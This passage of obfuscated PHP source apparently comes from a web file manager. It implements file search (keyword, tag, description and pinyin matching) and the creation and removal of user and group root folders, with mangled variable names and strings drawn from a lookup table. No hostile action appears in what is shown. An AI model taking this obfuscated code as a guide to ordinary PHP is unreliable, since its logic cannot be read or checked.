$ÆÄÇ±í = Model($¼œİ£ÊÂ[608])->getInfo($ÚïğÒ §); $§‹®¢Õò = array($¼œİ£ÊÂ[662] => SourceModel::TYPE_USER, $¼œİ£ÊÂ[595] => array($¼œİ£ÊÂ[626], $¼œİ£ÊÂ[604] . $ÆÄÇ±í[$¼œİ£ÊÂ[90]][$¼œİ£ÊÂ[193]] . $¼œİ£ÊÂ[627]), $¼œİ£ÊÂ[663] => $ÚïğÒ §, $¼œİ£ÊÂ[660] => 0, $¼œİ£ÊÂ[661] => $¨ØÚÍ·); return $this->listSource($§‹®¢Õò); } public function listSearch($í¤’£ , $ÆºĞıÚ© = 300) { $óØ”—ĞÓ =& $_SERVER[¼’ç§¼´]; if (isset($í¤’£ [$óØ”—ĞÓ[2082]]) && $í¤’£ [$óØ”—ĞÓ[2082]]) { $í¤’£ [$óØ”—ĞÓ[2082]] = str_replace($óØ”—ĞÓ[471], $óØ”—ĞÓ[2249], trim($í¤’£ [$óØ”—ĞÓ[2082]])); } $§ ˆıâİ = $this->_parseSearchWhere($í¤’£ ); if (!isset($§ ˆıâİ[$óØ”—ĞÓ[516]])) { $§ ˆıâİ[$óØ”—ĞÓ[516]] = 0; } $‰ó’ƒş´ = $óØ”—ĞÓ[2250]; $¹«€ö† = $§ ˆıâİ; $–µ½µŸñ = $‰ó’ƒş´; $this->_listSearchBindPinyin($í¤’£ , $§ ˆıâİ, $‰ó’ƒş´); $this->alias($óØ”—ĞÓ[530])->_makeOrder(); $§ ˆıâİ = $this->parseWhereLike($§ ˆıâİ); $‰ƒØøÈ = $this->distinct(!0)->field($‰ó’ƒş´)->where($§ ˆıâİ)->selectPage($ÆºĞıÚ©); if ($GLOBALS[$óØ”—ĞÓ[6]][$óØ”—ĞÓ[468]][$óØ”—ĞÓ[469]] && Input::check($í¤’£ [$óØ”—ĞÓ[2082]], $óØ”—ĞÓ[669]) && $‰ƒØøÈ[$óØ”—ĞÓ[453]][$óØ”—ĞÓ[430]] == 1 && $‰ƒØøÈ[$óØ”—ĞÓ[453]][$óØ”—ĞÓ[454]] == 0) { $‰ƒØøÈ = $this->distinct(!0)->field($‰ó’ƒş´)->where($¹«€ö†)->limit(1000)->select(); $‰ƒØøÈ = array_page_split($‰ƒØøÈ, !1, $ÆºĞıÚ©); } $this->_listSearchFileContent($‰ƒØøÈ, $í¤’£ , $–µ½µŸñ, $¹«€ö†); $this->_listSearchDesc($‰ƒØøÈ, $í¤’£ , $–µ½µŸñ); $this->_listSearchTag($‰ƒØøÈ, $í¤’£ , $–µ½µŸñ); $this->_listSearchGroupTag($‰ƒØøÈ, $í¤’£ , $–µ½µŸñ); $this->_listDataApply($‰ƒØøÈ[$óØ”—ĞÓ[456]]); $this->_listMake($‰ƒØøÈ); return $‰ƒØøÈ; } private function _listSearchFileContent(&$ãéÉâìô, $ª×Ú†·Â, $ êáï©Î, $Ø³ßşûÁ) { $Ø™ÀÂ¶ =& $_SERVER[¼’ç§¼´]; if (!$ª×Ú†·Â[$Ø™ÀÂ¶[2082]] || $ãéÉâìô[$Ø™ÀÂ¶[453]][$Ø™ÀÂ¶[430]] > 1) { return; } if (!isset($Ø³ßşûÁ[$Ø™ÀÂ¶[32]]) || !is_array($ª×Ú†·Â[$Ø™ÀÂ¶[552]])) { return; } $Ø³ßşûÁ[$Ø™ÀÂ¶[552]] = array($Ø™ÀÂ¶[7], $ª×Ú†·Â[$Ø™ÀÂ¶[552]]); unset($Ø³ßşûÁ[$Ø™ÀÂ¶[32]]); unset($ª×Ú†·Â[$Ø™ÀÂ¶[552]]); $‰éïƒ‘… = $this->field($ êáï©Î)->where($Ø³ßşûÁ)->limit($Ø™ÀÂ¶[2251])->select(); if (!$‰éïƒ‘… || count($‰éïƒ‘…) == 0) { return; } $ãéÉâìô[$Ø™ÀÂ¶[456]] = array_merge($‰éïƒ‘…, $ãéÉâìô[$Ø™ÀÂ¶[456]]); $ãéÉâìô[$Ø™ÀÂ¶[453]][$Ø™ÀÂ¶[454]] += count($‰éïƒ‘…); } private function _listSearchTag(&$Û¦Ãµ, $„¶°¨›¡, $¼™àóŞ‡) { $ìÆúÔ˜… =& $_SERVER[¼’ç§¼´]; if (!$„¶°¨›¡[$ìÆúÔ˜…[2082]] || $Û¦Ãµ[$ìÆúÔ˜…[453]][$ìÆúÔ˜…[430]] > 1) { return; } $¢ùàœ„³ = Model($ìÆúÔ˜…[2252])->listData(); $Ê¤Õº†Ê = array(); $”®ºµó¼ = $„¶°¨›¡[$ìÆúÔ˜…[2082]]; foreach ($¢ùàœ„³ as $Îà…¯„ƒ) { $¾ÚøïÌ = $Îà…¯„ƒ[$ìÆúÔ˜…[32]]; $‚µÓïú = str_replace($ìÆúÔ˜…[53], $ìÆúÔ˜…[12], Pinyin::get($¾ÚøïÌ)); if (stripos($¾ÚøïÌ, $”®ºµó¼) !== !1 || stripos($‚µÓïú, $”®ºµó¼) !== !1) { $Ê¤Õº†Ê[] = $Îà…¯„ƒ[$ìÆúÔ˜…[486]]; } } if (!$Ê¤Õº†Ê) { return; } $ ÕÌåŒì = array($ìÆúÔ˜…[511] => array($ìÆúÔ˜…[7], $Ê¤Õº†Ê), $ìÆúÔ˜…[1783] => USER_ID); $Ï–»î³ = Model($ìÆúÔ˜…[513])->field($ìÆúÔ˜…[87])->where($ ÕÌåŒì)->select(); $Ï–»î³ = array_to_keyvalue($Ï–»î³, $ìÆúÔ˜…[12], $ìÆúÔ˜…[87]); $ŒÁ¥ŠÍ = array_unique($Ï–»î³); $this->_listSearchMerge($Û¦Ãµ, $„¶°¨›¡, $¼™àóŞ‡, $ŒÁ¥ŠÍ); } private function _listSearchDesc(&$º—Î²§Ó, $Î¤­ê½¿, $áå¤éş) { $‘•½©Ë« =& $_SERVER[¼’ç§¼´]; if (!$Î¤­ê½¿[$‘•½©Ë«[2082]] || $º—Î²§Ó[$‘•½©Ë«[453]][$‘•½©Ë«[430]] > 1) { return; } $ù¸Üß«ò = array($‘•½©Ë«[97] => $‘•½©Ë«[537], $‘•½©Ë«[461] => array($‘•½©Ë«[470], $‘•½©Ë«[2084] . $Î¤­ê½¿[$‘•½©Ë«[2082]] . $‘•½©Ë«[2084])); $Ú®¡Ò‡¡ = !1; if ($Ú®¡Ò‡¡) { $ø”ŞÀà = $this->listSearchChildren($Î¤­ê½¿[$‘•½©Ë«[192]]); $ø”ŞÀà = array_unique($ø”ŞÀà); if (!$ø”ŞÀà) { return; } $ù¸Üß«ò[$‘•½©Ë«[193]] = array($‘•½©Ë«[7], $ø”ŞÀà); } $¢Ø‡Òˆ™ = Model($‘•½©Ë«[646])->field($‘•½©Ë«[193])->where($ù¸Üß«ò)->limit(5000)->select(); $Äè±ƒœš = array_to_keyvalue($¢Ø‡Òˆ™, $‘•½©Ë«[12], $‘•½©Ë«[193]); $this->_listSearchMerge($º—Î²§Ó, $Î¤­ê½¿, $áå¤éş, $Äè±ƒœš); } private function _listSearchGroupTag(&$‚Õ²ŠïÙ, $çúä…—š, $Ùçï¸‘÷) { $üÀ³È´‘ =& $_SERVER[¼’ç§¼´]; if (!$çúä…—š[$üÀ³È´‘[2082]] || $‚Õ²ŠïÙ[$üÀ³È´‘[453]][$üÀ³È´‘[430]] > 1 || !$çúä…—š[$üÀ³È´‘[192]]) { return; } $šÔéÏ¦Å = $this->sourceInfo($çúä…—š[$üÀ³È´‘[192]]); if (!$šÔéÏ¦Å || $šÔéÏ¦Å[$üÀ³È´‘[190]] != SourceModel::TYPE_GROUP) { return; } $·Úî¸Ô’ = $šÔéÏ¦Å[$üÀ³È´‘[580]]; $¼ÉÔóÈ = Model($üÀ³È´‘[2253])->get($·Úî¸Ô’); $æŒïùæ = array(); $ô¢Íö©û = $çúä…—š[$üÀ³È´‘[2082]]; foreach ($¼ÉÔóÈ[$üÀ³È´‘[456]] as $ÄÏ’‡ÃÌ) { $…€¸šĞ¢ = $ÄÏ’‡ÃÌ[$üÀ³È´‘[32]]; $¹•À‡£ = str_replace($üÀ³È´‘[53], $üÀ³È´‘[12], Pinyin::get($…€¸šĞ¢)); if (stripos($…€¸šĞ¢, $ô¢Íö©û) !== !1 || stripos($¹•À‡£, $ô¢Íö©û) !== !1) { $æŒïùæ[] = $ÄÏ’‡ÃÌ[$üÀ³È´‘[486]]; } } if (!$æŒïùæ) { return; } $—ª¯’ = array($üÀ³È´‘[511] => array($üÀ³È´‘[7], $æŒïùæ), $üÀ³È´‘[1783] => 0, $üÀ³È´‘[33] => $üÀ³È´‘[2104] . $·Úî¸Ô’); $½íÊõ‰± = Model($üÀ³È´‘[513])->field($üÀ³È´‘[87])->where($—ª¯’)->select(); $½íÊõ‰± = array_to_keyvalue($½íÊõ‰±, $üÀ³È´‘[12], $üÀ³È´‘[87]); $¸Şü±° = array_unique($½íÊõ‰±); $this->_listSearchMerge($‚Õ²ŠïÙ, $çúä…—š, $Ùçï¸‘÷, $¸Şü±°); } private function _listSearchMerge(&$âŞ„¢ë, $õü¸§î¢, $Ààš×Á¿, $Š”Î¿½ë) { $Œ–°ã¶é =& $_SERVER[¼’ç§¼´]; if (!$Š”Î¿½ë) { return; } $üãß‡Æ = array_to_keyvalue($âŞ„¢ë[$Œ–°ã¶é[456]], $Œ–°ã¶é[12], $Œ–°ã¶é[193]); $ÇÀÊ¬ = array_diff($Š”Î¿½ë, $üãß‡Æ); if (!$ÇÀÊ¬) { return; } $˜±ïøŠ  = array($Œ–°ã¶é[193] => array($Œ–°ã¶é[7], $ÇÀÊ¬)); $ï—»Áå  = $this->field($Ààš×Á¿)->where($˜±ïøŠ )->select(); if (!$ï—»Áå ) { return; } $•ïğà = array(); foreach ($ï—»Áå  as $áÛŸßæŠ) { if ($this->_listSearchFilter($áÛŸßæŠ, $õü¸§î¢)) { $•ïğà[] = $áÛŸßæŠ; } } $âŞ„¢ë[$Œ–°ã¶é[456]] = array_merge($•ïğà, $âŞ„¢ë[$Œ–°ã¶é[456]]); $âŞ„¢ë[$Œ–°ã¶é[453]][$Œ–°ã¶é[454]] += count($•ïğà); } private function _listSearchFilter($–…à—âó, $âÓıæéş) { $ÂƒÆ²…­ =& $_SERVER[¼’ç§¼´]; $’ÜŒ ” = $–…à—âó[$ÂƒÆ²…­[496]] == $ÂƒÆ²…­[91]; if (!strstr($–…à—âó[$ÂƒÆ²…­[595]], $ÂƒÆ²…­[50] . $âÓıæéş[$ÂƒÆ²…­[192]] . $ÂƒÆ²…­[50])) { return !1; } if (isset($âÓıæéş[$ÂƒÆ²…­[497]]) && $âÓıæéş[$ÂƒÆ²…­[497]] != $ÂƒÆ²…­[864]) { if ($âÓıæéş[$ÂƒÆ²…­[497]] == $ÂƒÆ²…­[78] && !$’ÜŒ ”) { return !1; } if ($âÓıæéş[$ÂƒÆ²…­[497]] != $ÂƒÆ²…­[78] && $’ÜŒ ”) { return !1; } if (!strstr($–…à—âó[$ÂƒÆ²…­[169]], $ÂƒÆ²…­[50] . $âÓıæéş[$ÂƒÆ²…­[497]] . $ÂƒÆ²…­[50])) { return !1; } } if (isset($âÓıæéş[$ÂƒÆ²…­[2254]]) && $âÓıæéş[$ÂƒÆ²…­[2254]] < $–…à—âó[$ÂƒÆ²…­[79]]) { return !1; } if (isset($âÓıæéş[$ÂƒÆ²…­[2255]]) && $âÓıæéş[$ÂƒÆ²…­[2255]] > $–…à—âó[$ÂƒÆ²…­[79]]) { return !1; } if (isset($âÓıæéş[$ÂƒÆ²…­[676]]) && $âÓıæéş[$ÂƒÆ²…­[676]] != $–…à—âó[$ÂƒÆ²…­[540]]) { return !1; } return !0; } public function listSearchChildren($•™ú’´¥, $¡ÖÙ†õ‘ = 5000) { $ø„°€ÁÚ =& $_SERVER[¼’ç§¼´]; $œ¼Ù¼·ü = array(); $ëÁ¹Ü¯Ÿ = $this->sourceInfo($•™ú’´¥); $€‚‡ì÷ = array($ø„°€ÁÚ[595] => array($ø„°€ÁÚ[470], $ëÁ¹Ü¯Ÿ[$ø„°€ÁÚ[595]] . $ëÁ¹Ü¯Ÿ[$ø„°€ÁÚ[193]] . $ø„°€ÁÚ[627])); $Ñ„şè€ô = $this->field($ø„°€ÁÚ[79])->where($€‚‡ì÷)->limit($¡ÖÙ†õ‘ + 1)->select(); $‰ÓÅ¿˜‡ = is_array($Ñ„şè€ô) ? count($Ñ„şè€ô) : 0; if ($‰ÓÅ¿˜‡ > $¡ÖÙ†õ‘) { return $this->_listSearchChildrenNear($•™ú’´¥, $¡ÖÙ†õ‘); } $œÙ‡µèå = $this->field($ø„°€ÁÚ[193])->where($€‚‡ì÷)->select(); $œ¼Ù¼·ü = array_to_keyvalue($œÙ‡µèå, $ø„°€ÁÚ[12], $ø„°€ÁÚ[193]); return $œ¼Ù¼·ü; } private function _listSearchChildrenNear($ÏÅÇ—üŠ, $¶¬¨ñ¬Ã) { $´ï»ˆ´ =& $_SERVER[¼’ç§¼´]; $÷»åÁÁÄ = array(); $˜Ø¡Æ×Ò = array($´ï»ˆ´[192] => $ÏÅÇ—üŠ); $‹ÈæÅŞù = $this->field($´ï»ˆ´[2256])->where($˜Ø¡Æ×Ò)->select(); $”àï¯À… = array_to_keyvalue(array_filter_by_field($‹ÈæÅŞù, $´ï»ˆ´[496], $´ï»ˆ´[91]), $´ï»ˆ´[12], $´ï»ˆ´[193]); $÷»åÁÁÄ = array_merge($÷»åÁÁÄ, array_to_keyvalue($‹ÈæÅŞù, $´ï»ˆ´[12], $´ï»ˆ´[193])); if (!$”àï¯À…) { return $÷»åÁÁÄ; } $˜Ø¡Æ×Ò = array($´ï»ˆ´[192] => array($´ï»ˆ´[7], $”àï¯À…)); $‹ÈæÅŞù = $this->field($´ï»ˆ´[2256])->where($˜Ø¡Æ×Ò)->limit($¶¬¨ñ¬Ã)->select(); $÷»åÁÁÄ = array_merge($÷»åÁÁÄ, array_to_keyvalue($‹ÈæÅŞù, $´ï»ˆ´[12], $´ï»ˆ´[193])); $÷»åÁÁÄ = array_slice($÷»åÁÁÄ, 0, intval($¶¬¨ñ¬Ã)); return $÷»åÁÁÄ; } private function _listSearchBindPinyin($æ¢Ñüü, &$äÉßŠÆÚ, &$Ò¨éñ¼•) { $Ø‚­Ÿ¨¡ =& $_SERVER[¼’ç§¼´]; if (!isset($æ¢Ñüü[$Ø‚­Ÿ¨¡[2082]]) || !$æ¢Ñüü[$Ø‚­Ÿ¨¡[2082]]) { return; } if (!Input::check($æ¢Ñüü[$Ø‚­Ÿ¨¡[2082]], $Ø‚­Ÿ¨¡[395]) || strlen($æ¢Ñüü[$Ø‚­Ÿ¨¡[2082]]) < 2) { return; } $È¦ùÙ± = "\x4c\105\106\x54\40\x4a\117\x49\116\40{$this->tablePrefix}\151\x6f\137\163\157\165\x72\143\145\x5f\x6d\145\x74\141\40\x6d\145\164\141\x20\157\156\x20\163\157\x75\x72\x63\x65\56\x73\157\x75\x72\x63\145\111\x44\40\x3d\x20\x6d\145\164\141\56\163\157\x75\162\143\x65\x49\x44"; $—¥´ş– = array(); $Ò¨éñ¼• = str_replace(array($Ø‚­Ÿ¨¡[287], $Ø‚­Ÿ¨¡[53], $Ø‚­Ÿ¨¡[2257]), $Ø‚­Ÿ¨¡[12], $Ò¨éñ¼•); $Ò¨éñ¼• = $Ø‚­Ÿ¨¡[522] . str_replace($Ø‚­Ÿ¨¡[50], $Ø‚­Ÿ¨¡[523], $Ò¨éñ¼•); $©ë‰Œ‡Ä = $äÉßŠÆÚ[$Ø‚­Ÿ¨¡[32]]; unset($äÉßŠÆÚ[$Ø‚­Ÿ¨¡[32]]); foreach ($äÉßŠÆÚ as $úİ¦€Œ => $³Åğ•ÎÛ) { $—¥´ş–[$Ø‚­Ÿ¨¡[522] . $úİ¦€Œ] = $³Åğ•ÎÛ; } foreach ($©ë‰Œ‡Ä as $ã­èúİ) { $—¥´ş–[] = array($Ø‚­Ÿ¨¡[527] => $ã­èúİ, $Ø‚­Ÿ¨¡[1086] => $Ø‚­Ÿ¨¡[2086], array($Ø‚­Ÿ¨¡[2258] => $ã­èúİ, $Ø‚­Ÿ¨¡[2259] => array($Ø‚­Ÿ¨¡[7], array($Ø‚­Ÿ¨¡[549], $Ø‚­Ÿ¨¡[548])))); } $this->join($È¦ùÙ±); $äÉßŠÆÚ = $—¥´ş–; } private function _parseSearchWhere($ÌÎª–ª) { $åË§ÂÎ’ =& $_SERVER[¼’ç§¼´]; $æ¹³›£µ = array(); if (isset($ÌÎª–ª[$åË§ÂÎ’[848]]) && $ÌÎª–ª[$åË§ÂÎ’[848]]) { $æ¹³›£µ[$åË§ÂÎ’[88]] = array($åË§ÂÎ’[2260], $ÌÎª–ª[$åË§ÂÎ’[848]]); } if (isset($ÌÎª–ª[$åË§ÂÎ’[849]]) && $ÌÎª–ª[$åË§ÂÎ’[849]]) { $ğ–¿Æ¯ = array($åË§ÂÎ’[2261], $ÌÎª–ª[$åË§ÂÎ’[849]]); if ($æ¹³›£µ[$åË§ÂÎ’[88]]) { $æ¹³›£µ[$åË§ÂÎ’[88]] = array($æ¹³›£µ[$åË§ÂÎ’[88]], $ğ–¿Æ¯, $åË§ÂÎ’[2262]); } else { $æ¹³›£µ[$åË§ÂÎ’[88]] = $ğ–¿Æ¯; } } if (isset($ÌÎª–ª[$åË§ÂÎ’[2254]]) && $ÌÎª–ª[$åË§ÂÎ’[2254]] > 0) { $æ¹³›£µ[$åË§ÂÎ’[79]] = array($åË§ÂÎ’[2260], $ÌÎª–ª[$åË§ÂÎ’[2254]]); } if (isset($ÌÎª–ª[$åË§ÂÎ’[2255]]) && $ÌÎª–ª[$åË§ÂÎ’[2255]]) { $ğ–¿Æ¯ = array($åË§ÂÎ’[2261], $ÌÎª–ª[$åË§ÂÎ’[2255]]); if ($æ¹³›£µ[$åË§ÂÎ’[79]]) { $æ¹³›£µ[$åË§ÂÎ’[79]] = array($æ¹³›£µ[$åË§ÂÎ’[79]], $ğ–¿Æ¯, $åË§ÂÎ’[2262]); } else { $æ¹³›£µ[$åË§ÂÎ’[79]] = $ğ–¿Æ¯; } } if (isset($ÌÎª–ª[$åË§ÂÎ’[676]]) && $ÌÎª–ª[$åË§ÂÎ’[676]]) { $æ¹³›£µ[] = array($åË§ÂÎ’[540] => $ÌÎª–ª[$åË§ÂÎ’[676]], $åË§ÂÎ’[538] => $ÌÎª–ª[$åË§ÂÎ’[676]], $åË§ÂÎ’[1086] => $åË§ÂÎ’[2086]); } if (isset($ÌÎª–ª[$åË§ÂÎ’[497]]) && $ÌÎª–ª[$åË§ÂÎ’[497]]) { $å€÷Ü = $ÌÎª–ª[$åË§ÂÎ’[497]]; if ($å€÷Ü == $åË§ÂÎ’[78]) { $æ¹³›£µ[$åË§ÂÎ’[496]] = 1; } else { if ($å€÷Ü == $åË§ÂÎ’[2263]) { $æ¹³›£µ[$åË§ÂÎ’[496]] = 0; } else { if ($å€÷Ü) { $å€÷Ü = is_array($å€÷Ü) ? $å€÷Ü : explode($åË§ÂÎ’[50], $å€÷Ü); $æ¹³›£µ[$åË§ÂÎ’[497]] = array($åË§ÂÎ’[503], $å€÷Ü); $æ¹³›£µ[$åË§ÂÎ’[496]] = 0; } } } } $this->_parseSearchParent($ÌÎª–ª, $æ¹³›£µ); if (isset($ÌÎª–ª[$åË§ÂÎ’[2082]]) && trim($ÌÎª–ª[$åË§ÂÎ’[2082]])) { $ëòŸí×» = trim($ÌÎª–ª[$åË§ÂÎ’[2082]]); $ü¤‚Ã• = explode($åË§ÂÎ’[53], $ëòŸí×»); if (strlen($ëòŸí×») > 2 && (substr($ëòŸí×», 0, 1) == $åË§ÂÎ’[121] && substr($ëòŸí×», -1) == $åË§ÂÎ’[121]) || substr($ëòŸí×», 0, 1) == $åË§ÂÎ’[58] && substr($ëòŸí×», -1) == $åË§ÂÎ’[58]) { $ëòŸí×» = substr($ëòŸí×», 1, -1); $ü¤‚Ã• = array($ëòŸí×»); } $æ¹³›£µ[$åË§ÂÎ’[32]] = array(array($åË§ÂÎ’[626], $åË§ÂÎ’[2084] . $ëòŸí×» . $åË§ÂÎ’[2084])); if (count($ü¤‚Ã•) > 1) { $æ¹³›£µ[$åË§ÂÎ’[32]] = array(); foreach ($ü¤‚Ã• as $¬Æäç™¦) { if (!trim($¬Æäç™¦)) { continue; } $æ¹³›£µ[$åË§ÂÎ’[32]][] = array($åË§ÂÎ’[626], $åË§ÂÎ’[2084] . trim($¬Æäç™¦) . $åË§ÂÎ’[2084]); } } } return $æ¹³›£µ; } private function _parseSearchParent($£¥§àóÈ, &$½†×ûíÔ) { $îáçÆÅ¿ =& $_SERVER[¼’ç§¼´]; if (!isset($£¥§àóÈ[$îáçÆÅ¿[192]]) || !$£¥§àóÈ[$îáçÆÅ¿[192]]) { return; } $‹³–À¹Î = $this->pathInfo($£¥§àóÈ[$îáçÆÅ¿[192]]); $Ù¯ßËÆ = $‹³–À¹Î[$îáçÆÅ¿[192]] . $îáçÆÅ¿[12] === $îáçÆÅ¿[230]; $´§ø“ú¥ = $‹³–À¹Î[$îáçÆÅ¿[190]] == $îáçÆÅ¿[589]; if ($‹³–À¹Î[$îáçÆÅ¿[605]] == $îáçÆÅ¿[606]) { $Á›Ş·ÇÛ = $this->sourceInfo($£¥§àóÈ[$îáçÆÅ¿[192]]); $‹³–À¹Î[$îáçÆÅ¿[595]] = $Á›Ş·ÇÛ[$îáçÆÅ¿[595]]; } $½†×ûíÔ[$îáçÆÅ¿[666]] = array($îáçÆÅ¿[626], $‹³–À¹Î[$îáçÆÅ¿[595]] . $£¥§àóÈ[$îáçÆÅ¿[192]] . $îáçÆÅ¿[627]); $ĞÔÎöşÄ = isset($£¥§àóÈ[$îáçÆÅ¿[1942]]) && in_array($îáçÆÅ¿[589], $£¥§àóÈ[$îáçÆÅ¿[1942]]); if (!$ĞÔÎöşÄ || !$´§ø“ú¥ || !$Ù¯ßËÆ || !$‹³–À¹Î[$îáçÆÅ¿[498]]) { return; } if (!AuthModel::authCheckRoot($‹³–À¹Î[$îáçÆÅ¿[498]][$îáçÆÅ¿[499]])) { return; } $ß†×ç¹ó = $‹³–À¹Î[$îáçÆÅ¿[580]] . $îáçÆÅ¿[12]; if ($ß†×ç¹ó == $îáçÆÅ¿[91]) { unset($½†×ûíÔ[$îáçÆÅ¿[666]]); $½†×ûíÔ[$îáçÆÅ¿[190]] = self::TYPE_GROUP; return; } $Õ¦íê¼ = Model($îáçÆÅ¿[596])->groupChildrenAll($ß†×ç¹ó); $‘Áö£À¦ = count($Õ¦íê¼); if ($‘Áö£À¦ <= 1) { return; } $Ÿ‚Ò€½Ô = array($îáçÆÅ¿[192] => 0, $îáçÆÅ¿[190] => self::TYPE_GROUP, $îáçÆÅ¿[580] => array($îáçÆÅ¿[7], $Õ¦íê¼)); $Ñæ¸ÌÄÎ = $this->field($îáçÆÅ¿[2264])->where($Ÿ‚Ò€½Ô)->limit($‘Áö£À¦)->select(); $½†×ûíÔ[$îáçÆÅ¿[666]] = array(); foreach ($Ñæ¸ÌÄÎ as $“šÎåÛÁ) { $½†×ûíÔ[$îáçÆÅ¿[666]][] = array($îáçÆÅ¿[626], $îáçÆÅ¿[604] . $“šÎåÛÁ[$îáçÆÅ¿[193]] . $îáçÆÅ¿[627]); } $½†×ûíÔ[$îáçÆÅ¿[666]][] = $îáçÆÅ¿[2086]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($×Ä¶ÑÀ›) { $±×Š†Šò =& $_SERVER[¼’ç§¼´]; $ğÙæ‰Ğƒ = Model($±×Š†Šò[588])->where(array($±×Š†Šò[1774] => $×Ä¶ÑÀ›))->find(); $šÜ¥ÌÇ = $this->_mkdirRoot(SourceModel::TYPE_USER, $×Ä¶ÑÀ›, $ğÙæ‰Ğƒ[$±×Š†Šò[32]]); $this->userDesktopAdd($šÜ¥ÌÇ); return $šÜ¥ÌÇ; } public function userDesktopAdd($úÑ…ş¸È) { $©µìÓƒè =& $_SERVER[¼’ç§¼´]; $¾ÆØ„ÆÙ = LNG($©µìÓƒè[2265]); $Ş‡×ä—ü = $this->mkdir($úÑ…ş¸È, $¾ÆØ„ÆÙ); $this->metaSet($Ş‡×ä—ü, $©µìÓƒè[2266], $©µìÓƒè[91]); $this->metaSet($úÑ…ş¸È, $©µìÓƒè[2267], $Ş‡×ä—ü); } public function userPathSafeAdd($ù²µÊºô) { $ÍÆİ » =& $_SERVER[¼’ç§¼´]; $ÔÙƒäÅ” = Model($ÍÆİ »[588])->getInfoFull($ù²µÊºô); if (!$ÔÙƒäÅ”) { return !1; } if (_get($ÔÙƒäÅ”, $ÍÆİ »[609])) { return $ÔÙƒäÅ”[$ÍÆİ »[550]][$ÍÆİ »[2268]]; } $¢‡‹Ïå« = $this->_mkdirRoot(SourceModel::TYPE_USER, $ù²µÊºô, $ÍÆİ »[2269], $ÍÆİ »[2270]); Model($ÍÆİ »[588])->metaSet($ù²µÊºô, $ÍÆİ »[2268], $¢‡‹Ïå«); $this->metaSet($¢‡‹Ïå«, $ÍÆİ »[2271], $ù²µÊºô); return $¢‡‹Ïå«; } public function userPathAppAdd($§öÔ‡œû, $£‹µìõ = '', $€Ş¼ÖÕÚ = '') { $Š¼è›ê® =& $_SERVER[¼’ç§¼´]; $Íú¹¿ë˜ = Model($Š¼è›ê®[588])->getInfoFull($§öÔ‡œû); if (!$Íú¹¿ë˜) { return !1; } $¸‹„ê¢ú = $Íú¹¿ë˜[$Š¼è›ê®[550]] ? $Íú¹¿ë˜[$Š¼è›ê®[550]] : array(); $ˆÅÎÆ…Š = $¸‹„ê¢ú[$Š¼è›ê®[2272]]; if (!$ˆÅÎÆ…Š) { $ˆÅÎÆ…Š = $this->_mkdirRoot(SourceModel::TYPE_USER, $§öÔ‡œû, $Š¼è›ê®[2273], $Š¼è›ê®[2274]); Model($Š¼è›ê®[588])->metaSet($§öÔ‡œû, $Š¼è›ê®[2272], $ˆÅÎÆ…Š . $Š¼è›ê®[12]); $this->metaSet($ˆÅÎÆ…Š, $Š¼è›ê®[2272], $§öÔ‡œû); } if (!$£‹µìõ) { return $ˆÅÎÆ…Š; } $…À¾ãŸ = $¸‹„ê¢ú[$Š¼è›ê®[2275] . $£‹µìõ]; if (!$…À¾ãŸ) { $…À¾ãŸ = $this->mkdir($ˆÅÎÆ…Š, $£‹µìõ); Model($Š¼è›ê®[588])->metaSet($§öÔ‡œû, $Š¼è›ê®[2275] . $£‹µìõ, $…À¾ãŸ); $this->metaSet($…À¾ãŸ, $Š¼è›ê®[2275] . $£‹µìõ, $§öÔ‡œû); } if (!$€Ş¼ÖÕÚ) { return $…À¾ãŸ; } $»´ûú½ = $this->mkdir($…À¾ãŸ, $€Ş¼ÖÕÚ); return $»´ûú½; } public function groupRootAdd($ËŞÑœÒ´) { $å¹ó—ˆä =& $_SERVER[¼’ç§¼´]; $Ââ»ù = Model($å¹ó—ˆä[596])->where(array($å¹ó—ˆä[2076] => $ËŞÑœÒ´))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ËŞÑœÒ´, $Ââ»ù[$å¹ó—ˆä[32]]); } public function systemRootPathAdd($“µ»üÊ€) { if ($“µ»üÊ€ != $_SERVER[¼’ç§¼´][619]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $“µ»üÊ€); } public function userRootRemove($îñ²Ğ“ó) { $º‰†Æ³— = $this->targetSourceRoot(SourceModel::TYPE_USER, $îñ²Ğ“ó, !0); foreach ($º‰†Æ³— as $ü¯í¡”Š) { if (!$ü¯í¡”Š) { continue; } $this->remove($ü¯í¡”Š[$_SERVER[¼’ç§¼´][193]], !1); } } public function groupRootRemove($×™À¾ùË) { $€É›øÙû = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $×™À¾ùË); if (!$€É›øÙû) { return; } $this->remove($€É›øÙû[$_SERVER[¼’ç§¼´][193]], !1); } private function _mkdirRoot($¾Äòã®Í, $‹–Óâëî, $¶€‹¢ú¯, $è„Øõâ« = '') { $¯úİçÌé =& $_SERVER[¼’ç§¼´]; $µ‹èİá = defined($¯úİçÌé[2211]) ? USER_ID : 0; $±Ü¦¢ÒÓ = array($¯úİçÌé[488] => 0, $¯úİçÌé[662] => $¾Äòã®Í, $¯úİçÌé[663] => $‹–Óâëî, $¯úİçÌé[660] => 1, $¯úİçÌé[664] => $µ‹èİá, $¯úİçÌé[665] => $µ‹èİá, $¯úİçÌé[661] => $è„Øõâ«, $¯úİçÌé[666] => $¯úİçÌé[604], $¯úİçÌé[515] => 0, $¯úİçÌé[631] => 0, $¯úİçÌé[553] => 0, $¯úİçÌé[667] => $¯úİçÌé[12]); if ($ÏøÉÆËå = $this->where($±Ü¦¢ÒÓ)->find()) { return $ÏøÉÆËå[$¯úİçÌé[193]]; } $™á¦ß‚Œ = "\x4d\157\x64\145\x6c\x53\x6f\165\x72\x63\x65\x2e\155\x6b\x64\x69\x72\122\x6f\x6f\x74\56{$¾Äòã®Í}\56{$‹–Óâëî}\x2e" . $¶€‹¢ú¯; CacheLock::lock($™á¦ß‚Œ); $±Ü¦¢ÒÓ[$¯úİçÌé[32]] = $¶€‹¢ú¯; $±Äâµ¦Ş = $this->add($±Ü¦¢ÒÓ); $ÒÚâ²‘Ò = array($¯úİçÌé[668] => short_id($±Äâµ¦Ş)); $this->where(array($¯úİçÌé[502] => $±Äâµ¦Ş))->save($ÒÚâ²‘Ò); CacheLock::unlock($™á¦ß‚Œ); return $±Äâµ¦Ş; } private function targetSourceRoot($¾Å‘¬ë¯, $Ö¶¸£½‚, $å‚ËÑÔ… = false) { $÷öÄ¿ç„ =& $_SERVER[¼’ç§¼´]; $€‡æÆ†Û = array($÷öÄ¿ç„[488] => 0, $÷öÄ¿ç„[662] => 